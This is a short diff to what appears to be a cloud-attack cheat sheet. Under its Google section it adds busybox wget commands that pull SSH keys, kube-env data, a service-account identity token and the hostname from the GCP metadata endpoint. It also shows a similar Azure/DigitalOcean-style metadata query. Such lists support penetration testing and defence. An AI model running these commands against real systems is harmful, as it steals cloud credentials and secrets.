@@ -165,7 +165,11 @@ busybox wget -q -O - http://169.254.169.254/metadata/v1/
 Google
 
 ```
-busybox wget http://metadata.google.internal/computeMetadata/v1beta1/project/attributes/ssh-keys?alt=json
+busybox wget -q -O - http://metadata.google.internal/computeMetadata/v1beta1/project/attributes/ssh-keys?alt=json
+busybox wget -q -O - http://metadata.google.internal/computeMetadata/v1beta1/project/attributes/sshKeys
+busybox wget -q -O - http://metadata.google.internal/computeMetadata/v1beta1/instance/attributes/kube-env
+busybox wget -q -O - http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/identity
+busybox wget -q -O - http://metadata.google.internal/computeMetadata/v1beta1/instance/hostname
 ```
 
 Azure
